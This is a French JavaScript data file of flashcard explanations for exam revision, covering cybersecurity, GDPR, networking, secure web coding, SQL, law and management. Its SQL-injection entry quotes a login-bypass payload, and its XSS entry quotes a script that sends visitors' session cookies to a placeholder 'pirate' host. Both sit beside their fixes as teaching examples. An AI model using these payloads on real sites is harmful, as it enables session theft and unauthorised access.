/* EXPLICATIONS DÉTAILLÉES DES FLASHCARDS — écrites à la main.
   EXPLIC[idNotion] = [ "En clair : l'idée expliquée simplement", "Un exemple concret", "Le piège à éviter / l'astuce pour retenir" ]
   Affichées sous la réponse de la flashcard et dans la bibliothèque (bouton « Explication détaillée »).
   Une notion absente de ce fichier affiche seulement sa réponse courte. */
window.EXPLIC = {
/* ───── E7 tronc commun ───── */
"dicp": ["Ce sont les quatre questions à se poser devant n'importe quel incident : est-ce que le service marche encore (D) ? Les données sont-elles toujours justes (I) ? Quelqu'un a-t-il vu ce qu'il ne devait pas voir (C) ? Peut-on prouver qui a fait quoi (P) ?", "Un rançongiciel chiffre le serveur de fichiers : la disponibilité est touchée (plus personne ne travaille), et si les données ont été volées avant, la confidentialité aussi.", "À l'examen, ne te contente pas de citer « confidentialité » : dis POURQUOI elle est touchée dans le cas précis. Astuce : D-I-C-P se lit « Dis, I C P ? »."],
"risque": ["Un risque, c'est une histoire en trois morceaux : quelqu'un ou quelque chose (la menace) profite d'une faiblesse (la vulnérabilité) et ça fait mal à l'entreprise (l'impact). On le note avec deux curseurs : à quel point ça fait mal (gravité) et à quel point c'est probable (vraisemblance).", "Mots de passe faibles + attaques par force brute courantes = vraisemblance forte ; si c'est le compte administrateur, gravité forte aussi → risque prioritaire.", "Ne confonds pas « réduire » le risque (mesure technique) et le « transférer » (assurance, sous-traitant). On ne supprime presque jamais complètement un risque."],
"ebios": ["EBIOS RM est la « recette » officielle française pour faire une analyse de risques, étape par étape. Tu n'as pas besoin de la dérouler entièrement : retiens ses mots et son échelle de gravité.", "Valeur métier : « prendre les commandes clients ». Bien support : le serveur web. Événement redouté : « le site de commande est indisponible pendant 2 jours ».", "Ne mélange pas valeur métier (ce que fait l'entreprise) et bien support (le matériel ou logiciel qui le permet)."],
"menace": ["La menace vient de l'extérieur ou d'un accident, la vulnérabilité est un « trou » chez toi, l'impact est la conséquence. Sans vulnérabilité, la menace ne passe pas.", "Menace : un pirate. Vulnérabilité : un serveur pas mis à jour (CVE connue). Impact : vol du fichier clients, amende CNIL, perte d'image.", "Une « faille » est une vulnérabilité, pas une menace. Si on te demande de proposer des mesures, elles agissent presque toujours sur la vulnérabilité."],
"rgpd-principes": ["Le RGPD dit en gros : on collecte les données pour une raison claire, seulement celles dont on a besoin, on les garde le temps nécessaire, on les protège, et on doit pouvoir prouver qu'on fait tout ça.", "Un formulaire de contact qui demande la date de naissance alors qu'elle ne sert à rien viole le principe de minimisation.", "« Consentement » n'est qu'UNE des six bases légales. Un employeur traite la paie sur la base d'une obligation légale, pas du consentement."],
"rgpd-dcp": ["Une donnée est personnelle dès qu'on peut retrouver la personne, même indirectement (une plaque d'immatriculation, une adresse IP). Les données « sensibles » sont celles qui pourraient servir à discriminer : santé, religion, opinions, orientation sexuelle, biométrie…", "Le numéro de badge d'un salarié est une donnée personnelle ; son arrêt maladie est une donnée sensible, interdite par principe sauf exception.", "Une donnée pseudonymisée reste personnelle ! Seule une donnée vraiment anonymisée (impossible de revenir à la personne) sort du RGPD."],
"rgpd-droits": ["Chaque personne garde la main sur ses données : elle peut savoir ce qu'on a sur elle, le corriger, le faire effacer, le récupérer, ou s'opposer à certains usages. L'entreprise doit répondre en 1 mois.", "Un ancien client demande la suppression de son compte : c'est le droit à l'effacement, sauf si une loi oblige à garder certaines données (factures 10 ans).", "Le droit à l'effacement n'est pas absolu : les obligations légales de conservation passent avant."],
"rgpd-violation": ["Une violation, c'est quand des données personnelles sont perdues, volées, modifiées ou rendues inaccessibles par accident ou attaque. Réflexe : 72 h pour prévenir la CNIL, et prévenir les personnes si le risque est élevé.", "Un portable non chiffré contenant le fichier clients est volé dans un train : violation de confidentialité → notification CNIL.", "Même si on ne notifie pas (risque faible), il faut TOUJOURS inscrire la violation dans le registre interne. Et un rançongiciel qui bloque l'accès aux données est aussi une violation (disponibilité)."],
"rgpd-acteurs": ["Le responsable de traitement décide « pourquoi et comment » ; le sous-traitant exécute pour lui ; le DPO conseille et contrôle ; la CNIL surveille. Le registre liste tous les traitements, l'AIPD étudie les traitements risqués.", "Une mairie (responsable) confie l'hébergement de son site à un prestataire (sous-traitant) : il faut un contrat avec des clauses RGPD.", "Le DPO n'est pas responsable à la place de l'entreprise : c'est toujours le responsable de traitement qui répond devant la CNIL."],
"cookies": ["Un site n'a pas le droit de déposer des traceurs publicitaires ou de mesure non essentiels avant que tu aies dit oui. Refuser doit être aussi simple qu'accepter.", "Un bandeau avec un gros bouton « Tout accepter » et un lien caché « paramétrer » n'est pas conforme : il faut aussi un bouton « Tout refuser » visible.", "Les cookies strictement nécessaires (panier, session) n'ont pas besoin de consentement."],
"logs": ["Un journal sert à savoir après coup ce qui s'est passé : qui, quand, quoi, d'où. Sans journaux, impossible d'enquêter ou de prouver une attaque.", "Ligne utile : « 2025-03-02 08:14:22 — compte jdupont — connexion VPN réussie — depuis 185.x.x.x ».", "Les journaux contiennent souvent des données personnelles : durée limitée (6 mois à 1 an conseillés par la CNIL) et accès restreint. Pense aussi à les protéger contre la modification (intégrité)."],
"mdp-politique": ["Un bon mot de passe est surtout LONG. La CNIL raisonne en entropie : plus il y a de combinaisons possibles, plus la force brute est longue. Un MFA permet d'exiger moins de complexité.", "« Soleil2024! » respecte les règles de complexité mais se devine vite ; une phrase de passe « cheval-batterie-agrafe-correct » est bien plus solide.", "Le changement forcé tous les 3 mois n'est plus recommandé : on le change en cas de compromission. Et on ne stocke JAMAIS un mot de passe en clair."],
"hachage": ["Hacher, c'est transformer le mot de passe en une empreinte qu'on ne peut pas inverser. À la connexion, on hache ce que tape l'utilisateur et on compare les empreintes. Le sel (aléatoire, différent par compte) empêche les attaques par tables précalculées.", "En PHP : password_hash($mdp, PASSWORD_DEFAULT) à l'inscription, password_verify($saisi, $hash) à la connexion.", "Hacher n'est pas chiffrer : un chiffrement se déchiffre avec la clé, un hachage ne se « déhache » pas. MD5 et SHA-1 seuls sont à éviter pour les mots de passe (trop rapides) : bcrypt ou Argon2."],
"mfa": ["Authentification forte = au moins deux preuves de nature différente : ce que je sais, ce que je possède, ce que je suis. Si le mot de passe fuit, le pirate est bloqué par le deuxième facteur.", "Mot de passe + code reçu dans une application d'authentification sur le téléphone = MFA. Mot de passe + question secrète = PAS MFA (deux fois « ce que je sais »).", "Deux mots de passe ne font pas une authentification forte. Pense à justifier en nommant les deux catégories."],
"moindre-privilege": ["Chacun reçoit uniquement les droits dont il a besoin pour son travail, ni plus ni moins. Si son compte est piraté, les dégâts restent limités.", "Le compte SQL de l'application web n'a que SELECT/INSERT/UPDATE sur ses tables, pas le droit de DROP ni l'accès aux autres bases.", "Un administrateur doit utiliser un compte normal pour son travail courant (mails, web) et un compte admin séparé seulement pour administrer."],
"sym-asym": ["Symétrique : une seule clé, comme une clé de maison qu'il faut donner en main propre. Asymétrique : une clé publique (cadenas qu'on distribue) et une clé privée (seule à ouvrir). En pratique on combine : l'asymétrique sert à échanger une clé symétrique, qui chiffre ensuite les données (c'est ce que fait TLS).", "AES-256 pour chiffrer un disque ; RSA ou ECDH pour échanger la clé de session d'une connexion HTTPS.", "Pour envoyer un message confidentiel à Bob, on chiffre avec la clé PUBLIQUE de Bob. Pour signer, on utilise SA PROPRE clé privée."],
"signature": ["Signer, c'est prouver « c'est bien moi, et le document n'a pas bougé ». On hache le document, on chiffre l'empreinte avec sa clé privée ; n'importe qui vérifie avec la clé publique. Elle garantit intégrité, authenticité et non-répudiation, mais PAS la confidentialité.", "Un fichier PDF signé : si quelqu'un change une virgule, la vérification échoue.", "Ne dis jamais qu'une signature rend le document secret : il reste lisible par tous."],
"certificat": ["Un certificat est une « carte d'identité » numérique : il dit « cette clé publique appartient bien à ce site », et c'est une autorité de confiance (AC) qui le signe. Le navigateur fait confiance aux AC qu'il connaît.", "Le cadenas sur https://www.impots.gouv.fr : le certificat prouve que tu parles bien au vrai site et pas à un imposteur.", "Un certificat auto-signé chiffre aussi bien, mais il ne prouve pas l'identité : le navigateur affiche une alerte. Pense aussi à la date d'expiration."],
"tls": ["HTTPS = HTTP dans un tunnel TLS. TLS apporte trois choses : on est sûr de parler au bon serveur, personne ne peut lire, personne ne peut modifier en route.", "Sans HTTPS, sur un Wi-Fi public, quelqu'un peut lire le mot de passe envoyé par le formulaire de connexion.", "HTTPS ne garantit pas que le site est honnête : un site d'hameçonnage peut avoir un certificat valide."],
"rancon": ["Le rançongiciel chiffre tes fichiers et réclame de l'argent pour la clé. Souvent les pirates volent aussi les données avant, pour menacer de les publier (double extorsion).", "Mesures classiques à citer : sauvegardes déconnectées testées, mises à jour, MFA sur les accès distants, segmentation, EDR, sensibilisation des salariés.", "Payer la rançon est déconseillé (ANSSI) : aucune garantie de récupérer les données. Et la sauvegarde doit être hors ligne, sinon elle est chiffrée elle aussi."],
"phishing": ["L'hameçonnage pousse à cliquer ou à donner un identifiant en jouant sur l'urgence ou l'autorité. On le repère avec des indices : adresse d'expéditeur bizarre, lien qui ne va pas où il dit, ton pressant, fautes, pièce jointe inattendue.", "« Votre compte Microsoft sera suspendu sous 24 h, cliquez ici » avec un lien vers micros0ft-login.com.", "Les contre-mesures doivent être des DEUX types : techniques (filtre anti-spam, SPF/DKIM/DMARC, MFA) ET humaines (sensibilisation, procédure de signalement)."],
"attaques": ["Les attaques se rangent en familles : tromper l'humain (ingénierie sociale), faire tourner un programme malveillant, deviner des mots de passe, saturer un service (déni de service), s'intercaler dans une communication (homme du milieu), profiter d'une faille de code (injection).", "Un DDoS rend le site indisponible ; une attaque de l'homme du milieu sur un Wi-Fi public vise la confidentialité.", "À l'examen, relie toujours l'attaque au critère DICP qu'elle touche : ça montre que tu comprends."],
"cve": ["Une CVE est le « numéro de dossier » officiel d'une faille connue ; le CVSS dit à quel point elle est grave (sur 10). Faire de la veille, c'est surveiller ces alertes pour corriger vite.", "Log4Shell (CVE-2021-44228), CVSS 10 : il fallait mettre à jour Log4j en urgence.", "Une CVE ne veut pas dire que tu es vulnérable : il faut vérifier que ta version du logiciel est concernée."],
"sauvegarde": ["3-2-1 : trois copies, sur deux supports différents, dont une à l'extérieur. Aujourd'hui on ajoute souvent « et une copie hors ligne ou immuable » contre les rançongiciels.", "Données sur le serveur + copie sur un NAS + copie chiffrée dans le cloud ou sur disque emporté chaque semaine.", "Une sauvegarde jamais restaurée n'est pas une sauvegarde : il faut TESTER la restauration régulièrement. Et le RAID n'est pas une sauvegarde."],
"archivage": ["Sauvegarder, c'est pouvoir revenir en arrière après un problème. Archiver, c'est garder longtemps des documents figés pour des raisons légales ou historiques.", "Copie nocturne du serveur gardée 30 jours = sauvegarde. Factures conservées 10 ans sur un support non modifiable = archivage.", "On écrase les vieilles sauvegardes ; on n'écrase jamais une archive avant la fin de sa durée légale."],
"pca": ["PCA : comment continuer à travailler pendant la crise. PRA : comment tout redémarrer après. RTO : combien de temps on accepte d'être arrêté. RPO : combien de données on accepte de perdre (exprimé en temps).", "RPO de 24 h → une sauvegarde par nuit suffit. RPO de 15 min → il faut de la réplication.", "Ne confonds pas RTO (durée d'arrêt) et RPO (perte de données). Astuce : RP-O comme « Perte Of data »."],
"stad": ["La loi Godfrain punit le fait d'entrer ou de rester sans droit dans un système informatique, de le perturber, ou d'en modifier les données. C'est l'article 323-1 et suivants du Code pénal.", "Un ancien salarié qui se connecte avec son compte non désactivé pour copier des fichiers commet un accès frauduleux dans un STAD.", "Même sans protection technique, l'accès peut être frauduleux si la personne sait qu'elle n'a pas le droit d'y être. Et l'entreprise qui n'a pas désactivé le compte a aussi commis une faute de sécurité."],
"charte": ["La charte informatique fixe les règles d'usage du matériel et du réseau. Pour qu'elle soit opposable (qu'on puisse sanctionner un salarié qui ne la respecte pas), elle doit suivre la même procédure que le règlement intérieur.", "Procédure : consultation du CSE, transmission à l'inspection du travail, dépôt au greffe du conseil de prud'hommes, puis information des salariés.", "Une simple note envoyée par mail ne suffit pas pour sanctionner. Et l'employeur ne peut pas tout contrôler : le contrôle doit être proportionné et les salariés informés."],
"anssi": ["ANSSI : la sécurité informatique de l'État et les bons conseils techniques. CNIL : la protection des données personnelles. CERT-FR : les alertes et la gestion des incidents.", "Fuite du fichier clients → on notifie la CNIL. On cherche un guide d'hygiène informatique → ANSSI. On veut les alertes sur une faille → CERT-FR.", "Seule la CNIL peut infliger des amendes RGPD ; l'ANSSI conseille et certifie."],
/* ───── E7 SISR ───── */
"parefeu": ["Une règle de pare-feu dit : « ce trafic, venant de là, allant là, sur ce port, je le laisse passer ou je le bloque ». Les règles sont lues de haut en bas, la première qui correspond s'applique ; tout en bas, une règle « tout refuser ».", "Autoriser le web vers la DMZ : source any, destination 172.16.0.10, port 443/TCP, ACCEPT. Puis tout le reste : DROP.", "Pense au sens : la destination port est le service (443), pas le port source. Et ordonne bien : une règle large placée trop haut masque les suivantes."],
"ports": ["Les ports identifient le service visé sur une machine. À l'examen, ils servent à écrire des règles de filtrage et à lire des captures réseau.", "Capture avec des milliers de tentatives vers le port 22 → attaque par force brute sur SSH. Port 3389 ouvert sur Internet → RDP exposé, dangereux.", "Distingue les versions sécurisées : HTTP 80 / HTTPS 443, LDAP 389 / LDAPS 636, SMTP 25 / SMTPS 465-587, Telnet 23 (à bannir) / SSH 22."],
"dmz": ["La DMZ est un « sas » entre Internet et le réseau interne. On y place les serveurs que l'extérieur doit joindre ; s'ils sont piratés, l'attaquant n'est pas directement dans le réseau des salariés.", "Le serveur web public et le relais de messagerie vont en DMZ ; la base de données RH reste dans le LAN, jamais en DMZ.", "Le trafic DMZ → LAN doit être très limité (voire interdit) : c'est tout l'intérêt."],
"vlan": ["Un VLAN coupe un même commutateur en plusieurs réseaux séparés, comme s'il y avait plusieurs switchs. Pour passer d'un VLAN à l'autre, il faut un routeur ou un pare-feu, qui peut filtrer.", "VLAN 10 Administration, VLAN 20 Production, VLAN 30 Invités : les invités ne voient pas les serveurs.", "Le lien entre deux switchs qui transporte plusieurs VLAN est un trunk (802.1Q, étiquetage). Un port d'accès appartient à un seul VLAN."],
"portsec": ["Port-security retient les adresses MAC autorisées sur un port. Si un appareil inconnu se branche, le switch réagit selon le mode : protect (ignore), restrict (ignore + journalise), shutdown (coupe le port).", "switchport port-security maximum 1 ; switchport port-security mac-address sticky ; switchport port-security violation shutdown.", "Une adresse MAC peut être usurpée : port-security est utile mais ne remplace pas 802.1X."],
"l2": ["Les attaques de niveau 2 visent le réseau local, au niveau des switchs : saturer la table MAC, se faire passer pour la passerelle (ARP), monter un faux serveur DHCP.", "Faux serveur DHCP qui donne sa propre IP comme passerelle → tout le trafic passe par l'attaquant. Parade : DHCP snooping (seuls les ports « de confiance » peuvent répondre).", "Associe chaque attaque à sa parade : MAC flooding → port-security ; DHCP spoofing → DHCP snooping ; ARP spoofing → Dynamic ARP Inspection."],
"8021x": ["Avec 802.1X, brancher un câble ou se connecter au Wi-Fi ne suffit plus : l'appareil doit d'abord s'authentifier auprès d'un serveur RADIUS, via le switch ou la borne. Tant que ce n'est pas fait, le port reste fermé.", "Un PC de l'entreprise s'authentifie avec un certificat machine et obtient le VLAN Production ; un appareil inconnu est placé dans un VLAN invité.", "Trois rôles à nommer : supplicant (le poste), authentificateur (switch/borne), serveur d'authentification (RADIUS, ex. NPS ou FreeRADIUS)."],
"wifi": ["En Wi-Fi Personnel, tout le monde partage la même clé ; en Entreprise, chacun s'authentifie avec son propre compte (802.1X). Pour les visiteurs, on utilise un portail captif sur un réseau isolé.", "Salariés : WPA3-Entreprise avec RADIUS. Clients d'un hôtel : réseau invité + portail captif + isolation des clients.", "WEP et WPA (1) sont cassés : ne jamais les proposer. Justifie toujours ton choix par le contexte (nombre d'utilisateurs, traçabilité)."],
"incident": ["Face à un incident, on suit un ordre : se préparer, repérer, isoler pour que ça ne s'étende pas, supprimer la cause, remettre en service, puis tirer les leçons.", "Poste infecté : on le débranche du réseau (confinement) avant de le nettoyer ou de le réinstaller (éradication), puis on restaure les données (rétablissement).", "Ne pas éteindre brutalement une machine compromise si on veut garder des preuves en mémoire : on l'isole du réseau."],
"ioc": ["Un IoC est une trace qui prouve qu'une machine a été compromise : un fichier connu, une IP malveillante, un nom de domaine, une clé de registre bizarre. On les cherche partout pour savoir où l'attaquant est passé.", "Le CERT-FR publie l'empreinte SHA-256 d'un maliciel : tu la cherches sur tous les postes avec l'EDR.", "Un IoC se périme vite (les IP changent) : il complète, mais ne remplace pas, la détection par comportement."],
"ids": ["IDS : alarme qui signale. IPS : alarme qui bloque aussi. EDR : surveillance sur chaque poste. SIEM : la salle de contrôle qui rassemble et corrèle les journaux de tout le système.", "Le SIEM voit 50 échecs de connexion sur 10 serveurs en 2 minutes depuis la même IP → alerte « force brute distribuée ».", "Un IDS placé en écoute ne bloque rien : si l'énoncé demande de bloquer, c'est un IPS (placé en coupure)."],
"snmp": ["SNMP permet à un serveur de supervision d'interroger les équipements (charge CPU, état des ports…) ; l'équipement peut aussi prévenir tout seul en cas de problème (trap).", "Le serveur Zabbix interroge le switch toutes les minutes ; quand un port tombe, le switch envoie un trap immédiatement.", "SNMP v1/v2c envoie la « communauté » (le mot de passe) en clair : v3 ajoute authentification et chiffrement. À justifier à chaque fois."],
"ha": ["Haute disponibilité = pas de point unique de panne. On double ce qui est critique et on organise la bascule automatique.", "Deux serveurs web derrière un répartiteur de charge HAProxy, lui-même doublé avec Keepalived (adresse IP virtuelle).", "Si tu doubles les serveurs mais qu'il n'y a qu'un switch ou une alimentation, le point unique de défaillance existe toujours : cherche-le."],
"ad": ["Active Directory est la cible n°1 des attaquants : qui contrôle l'AD contrôle tout. Le durcir, c'est limiter les comptes à privilèges, supprimer les vieux systèmes et mots de passe faibles, surveiller.", "Un audit PingCastle signale 12 membres du groupe Admins du domaine et des comptes dont le mot de passe n'expire jamais : on réduit à 2-3 comptes nominatifs.", "Les comptes à privilèges ne doivent jamais se connecter sur des postes ordinaires (risque de vol d'identifiants en cache) : c'est le modèle en tiers."],
"proxy": ["Un proxy (direct) se place devant les utilisateurs pour aller sur Internet à leur place : il filtre et journalise. Un proxy inverse se place devant les serveurs pour recevoir les visiteurs à leur place : il protège et répartit.", "Squid filtre les sites des salariés ; Nginx ou HAProxy en proxy inverse reçoit les requêtes HTTPS et les transmet aux serveurs web internes.", "Le sens compte : proxy = côté clients sortants, proxy inverse = côté serveurs entrants."],
"vpn": ["Un VPN crée un tunnel chiffré à travers Internet, comme si on tirait un câble privé. Site à site : relie deux agences. Accès distant : relie un salarié nomade au réseau.", "Le siège et l'agence de Lyon reliés par IPsec ; les télétravailleurs se connectent avec WireGuard ou OpenVPN + MFA.", "Un VPN chiffre le trajet, il ne protège pas un poste déjà infecté : on combine avec MFA et contrôle du poste."],
/* ───── E7 SLAM ───── */
"sqli": ["Une injection SQL arrive quand le texte tapé par l'utilisateur est collé directement dans la requête : il peut alors en changer le sens. La parade : les requêtes préparées, qui séparent la requête des données.", "Login saisi : ' OR '1'='1' -- → la requête devient vraie pour tout le monde et on se connecte sans mot de passe.", "Échapper à la main ou filtrer les apostrophes ne suffit pas : la vraie réponse attendue est la requête préparée. Ajoute le moindre privilège du compte SQL en complément."],
"prepare": ["On envoie d'abord la requête avec des « trous » (?, :nom), puis les valeurs séparément : la base ne peut plus confondre code et données.", "$stmt = $pdo->prepare('SELECT * FROM client WHERE email = :email'); $stmt->execute(['email' => $email]);", "Ne concatène JAMAIS la variable dans la chaîne passée à prepare(), sinon la préparation ne sert à rien."],
"xss": ["Une XSS, c'est quand un site affiche tel quel un texte contenant du JavaScript : le script s'exécute chez les autres visiteurs (vol de cookie de session, redirection…). Stockée : enregistrée en base. Reflétée : renvoyée immédiatement dans la page.", "Un commentaire <script>fetch('https://pirate/?c='+document.cookie)</script> affiché à tous les visiteurs = XSS stockée.", "On corrige à l'AFFICHAGE avec htmlspecialchars() (échappement en sortie), pas seulement à la saisie. Les cookies HttpOnly limitent le vol de session."],
"csrf": ["La CSRF fait faire à ta place, sans que tu le saches, une action sur un site où tu es connecté, depuis un autre site. La parade : un jeton secret aléatoire dans chaque formulaire, vérifié par le serveur.", "Un lien piégé déclenche « changer l'adresse e-mail du compte » sur la banque où la victime est connectée.", "HTTPS ne protège pas de la CSRF. Les cookies SameSite aident, le jeton anti-CSRF reste la réponse attendue."],
"owasp": ["L'OWASP Top 10 est la liste des 10 familles de failles web les plus fréquentes, mise à jour régulièrement. C'est un excellent plan pour auditer une application.", "A01 Contrôle d'accès défaillant (un utilisateur voit les factures d'un autre), A03 Injection, A07 Défauts d'identification et d'authentification.", "Le n°1 de 2021 est le contrôle d'accès défaillant, pas l'injection : erreur classique."],
"idor": ["IDOR : l'application se fie à un identifiant envoyé par le client sans vérifier que l'utilisateur a le droit de voir cet objet.", "facture.php?id=1042 → l'utilisateur change en id=1043 et voit la facture d'un autre client. Correction : WHERE id = :id AND idClient = :idClientConnecté.", "Cacher le bouton dans l'interface ne suffit pas : le contrôle doit toujours être fait CÔTÉ SERVEUR."],
"grant": ["On crée un compte SQL dédié à chaque usage et on lui donne seulement les droits utiles, sur les seules tables utiles, depuis le seul hôte utile.", "CREATE USER 'appli'@'192.168.10.5' IDENTIFIED BY '…'; GRANT SELECT, INSERT ON gestion.commande TO 'appli'@'192.168.10.5';", "N'oublie pas l'hôte (@) : 'appli'@'%' autorise la connexion depuis n'importe où. REVOKE retire un droit déjà donné."],
"groupby": ["GROUP BY regroupe les lignes qui ont la même valeur pour calculer un total, un nombre, une moyenne par groupe. WHERE filtre les lignes AVANT le regroupement, HAVING filtre les groupes APRÈS.", "SELECT idCategorie, COUNT(*) AS nb FROM produit GROUP BY idCategorie HAVING COUNT(*) > 5;", "Une condition sur un COUNT ou un SUM va dans HAVING, jamais dans WHERE. Toute colonne du SELECT qui n'est pas agrégée doit être dans le GROUP BY."],
"trigger": ["Un déclencheur est un petit programme que la base lance toute seule avant ou après un INSERT, UPDATE ou DELETE. OLD = la ligne avant, NEW = la ligne après.", "AFTER UPDATE ON utilisateur : INSERT INTO historique VALUES (OLD.id, OLD.mdp, NOW()); → garde l'ancien mot de passe haché.", "En INSERT il n'y a pas de OLD, en DELETE pas de NEW. Pour bloquer une opération : BEFORE + SIGNAL SQLSTATE '45000'."],
"transaction": ["Une transaction regroupe plusieurs requêtes en « tout ou rien » : soit tout est validé (COMMIT), soit tout est annulé (ROLLBACK). ACID : atomicité, cohérence, isolation, durabilité.", "Virement : débiter le compte A et créditer le compte B dans la même transaction ; si le crédit échoue, le débit est annulé.", "Sans transaction, une panne entre les deux requêtes fait « disparaître » de l'argent : c'est l'exemple à donner."],
"vue": ["Une vue est une requête enregistrée qu'on interroge comme une table. Pour la sécurité, on donne accès à la vue (colonnes et lignes utiles) plutôt qu'à la table complète.", "CREATE VIEW v_clients_public AS SELECT id, nom, ville FROM client; → le service marketing ne voit pas les numéros de téléphone ni les dates de naissance.", "Une vue ne stocke pas de données (sauf vue matérialisée) : elle se recalcule à chaque lecture."],
"modele": ["Une association plusieurs-à-plusieurs devient une table à part, dont la clé primaire est composée des deux clés étrangères. Une association un-à-plusieurs devient une simple clé étrangère du côté « plusieurs ».", "Un étudiant suit plusieurs cours, un cours a plusieurs étudiants → table Inscription(#idEtudiant, #idCours, dateInscription).", "Les attributs qui dépendent des deux (date d'inscription, note) vont dans la table d'association, pas dans les entités."],
"jwt": ["Un JWT est un « badge » signé que le serveur remet après la connexion. Le client le renvoie à chaque requête ; le serveur vérifie la signature sans avoir à garder de session. Il contient un en-tête, des données (claims) et une signature.", "Authorization: Bearer eyJhbGciOi… ; la donnée exp fixe l'expiration à 15 minutes.", "Le contenu d'un JWT n'est PAS chiffré, juste encodé en base64 : n'y mets jamais de mot de passe. Une durée de vie courte limite les dégâts en cas de vol."],
"http": ["Une API REST utilise les verbes HTTP comme des actions sur des ressources, et répond avec un code qui dit ce qui s'est passé.", "GET /clients/12 → 200 ; POST /clients → 201 ; sans jeton → 401 ; jeton valide mais pas le droit → 403 ; client inexistant → 404.", "401 = « je ne sais pas qui tu es » (non authentifié) ; 403 = « je sais qui tu es, mais c'est non » (non autorisé). C'est LE piège classique."],
"sso": ["Le SSO permet de se connecter une seule fois pour accéder à plusieurs applications. Plus pratique, moins de mots de passe à retenir, comptes désactivés partout d'un coup. Mais si ce compte unique est volé, tout est ouvert.", "Connexion avec le compte Microsoft de l'entreprise qui ouvre la messagerie, l'intranet et l'outil de tickets.", "Le risque du SSO se traite par le MFA : à citer systématiquement dans les inconvénients/solutions."],
"tests": ["Un test unitaire vérifie automatiquement qu'une petite partie du code (une méthode) donne le bon résultat. On les relance à chaque modification pour éviter de casser ce qui marchait (non-régression).", "assertEquals(20.0, $commande->getTotalTTC()); pour une commande de 16,67 € HT avec TVA à 20 %.", "Teste aussi les cas limites et les erreurs (quantité négative, valeur nulle), pas seulement le cas normal."],
"mvc": ["MVC sépare l'application en trois rôles : le Modèle gère les données, la Vue affiche, le Contrôleur reçoit la demande et fait le lien. Chacun peut évoluer sans casser les autres.", "Le contrôleur ClientController reçoit /client/12, demande au modèle Client les données, puis les passe à la vue fiche_client.php.", "Pas de requête SQL dans la vue ! C'est l'erreur que les correcteurs repèrent tout de suite."],
/* ───── E4 Droit ───── */
"raisonnement": ["Le raisonnement juridique est une méthode en étapes : les faits, la question de droit, la règle, l'application de la règle aux faits, la conclusion. Il tombe à CHAQUE session : c'est des points assurés si tu suis la méthode.", "Faits : un prestataire livre un logiciel avec 3 mois de retard. Problème : le client peut-il obtenir réparation ? Règle : art. 1231-1 C. civ. Application… Conclusion : oui, des dommages et intérêts.", "Ne saute pas l'étape « application » : c'est elle qui rapporte le plus de points. Ne recopie pas les faits, qualifie-les juridiquement."],
"resp-civile": ["Pour obtenir réparation, il faut prouver trois choses : un fait générateur (une faute ou l'inexécution du contrat), un dommage, et un lien de causalité entre les deux.", "Un hébergeur perd les données d'un client par négligence : faute (pas de sauvegarde), dommage (perte de chiffre d'affaires), lien direct → responsabilité.", "Distingue contractuelle (il y a un contrat entre les deux) et extracontractuelle (pas de contrat, art. 1240)."],
"oblig": ["Obligation de résultat : le prestataire promet un résultat précis, il est responsable s'il ne l'atteint pas. Obligation de moyens : il promet de tout faire au mieux, le client doit prouver une faute.", "Livrer un logiciel conforme au cahier des charges = résultat. Assurer la sécurité d'un système face aux attaques = souvent moyens.", "La différence se joue sur la PREUVE : c'est ce qu'il faut expliquer dans ta réponse."],
"inexecution": ["Quand l'autre ne respecte pas le contrat, on a plusieurs options (art. 1217 C. civ.) : suspendre sa propre obligation, exiger l'exécution, réduire le prix, résoudre (annuler) le contrat, demander des dommages et intérêts. On peut les cumuler si elles sont compatibles.", "Un client reçoit un site web non fonctionnel : il peut refuser de payer le solde (exception d'inexécution) et demander réparation.", "Cite l'article 1217 du Code civil : c'est attendu."],
"contrat-travail": ["Certaines clauses du contrat de travail ne sont valables que si elles respectent des conditions : clause de non-concurrence (limitée dans le temps et l'espace, contrepartie financière, intérêt de l'entreprise), clause de mobilité (zone précise), clause de confidentialité.", "Une clause de non-concurrence sans indemnité pour un développeur → nulle.", "Pour la non-concurrence, oublier la contrepartie financière est l'erreur fréquente : c'est la condition qui annule le plus souvent la clause."],
"pi": ["Un logiciel est protégé par le droit d'auteur dès sa création, sans dépôt obligatoire. Quand c'est un salarié qui le développe dans le cadre de son travail, les droits patrimoniaux appartiennent à l'employeur.", "Un développeur salarié quitte l'entreprise : il ne peut pas réutiliser le code chez son nouvel employeur.", "Pour un prestataire freelance, ce n'est PAS automatique : il faut une cession de droits écrite dans le contrat."],
"preuve": ["L'écrit électronique a la même valeur qu'un écrit papier, à deux conditions : on peut identifier son auteur et il est conservé de façon à garantir son intégrité (art. 1366 C. civ.).", "Un contrat signé avec une signature électronique qualifiée et archivé est une preuve valable.", "Un simple mail peut servir de preuve, mais sa force est moindre s'il est contesté : d'où l'intérêt de la signature électronique."],
/* ───── E4 Management ───── */
"pestel": ["PESTEL est une check-list pour analyser l'environnement extérieur : Politique, Économique, Socioculturel, Technologique, Écologique, Légal. Chaque élément se classe ensuite en opportunité ou en menace.", "Pour une ESN : pénurie de développeurs (socioculturel → menace), essor de l'IA (technologique → opportunité), RGPD (légal → contrainte).", "PESTEL n'analyse que l'EXTÉRIEUR. Les forces et faiblesses internes vont dans le SWOT, pas ici."],
"swot": ["Le SWOT croise l'interne (forces, faiblesses) et l'externe (opportunités, menaces) pour aider à choisir une stratégie.", "Force : équipe experte en cybersécurité. Faiblesse : faible notoriété. Opportunité : obligations NIS2. Menace : concurrence des grands groupes.", "Ne mets pas une opportunité dans les forces : l'opportunité vient de l'environnement, la force vient de l'entreprise."],
"porter": ["Les 5 forces de Porter mesurent l'intensité concurrentielle d'un secteur : rivalité entre concurrents, menace des nouveaux entrants, menace des produits de substitution, pouvoir des fournisseurs, pouvoir des clients. L'État est parfois ajouté comme 6e force.", "Pour un éditeur de logiciel : pouvoir des clients fort (beaucoup d'offres), substitution par des solutions gratuites open source.", "Il ne s'agit pas de lister les concurrents, mais d'évaluer chaque force (forte/faible) et ce qu'elle implique."],
"strat-globale": ["La stratégie globale répond à « dans quels métiers l'entreprise veut-elle être ? » : se spécialiser, se diversifier, intégrer des étapes en amont ou en aval, externaliser, et comment grandir (croissance interne ou rachat).", "Une ESN qui rachète une société de cybersécurité : diversification par croissance externe.", "Donne toujours un avantage ET un risque de la stratégie identifiée, en lien avec le cas."],
"strat-domaine": ["Sur un marché donné, on gagne soit en étant moins cher (domination par les coûts), soit en étant différent et meilleur (différenciation), soit en se concentrant sur une niche (focalisation).", "Un hébergeur « souverain » 100 % France qui vise les collectivités : différenciation + focalisation.", "Ne confonds pas stratégie globale (quels métiers) et stratégie de domaine (comment gagner sur un métier)."],
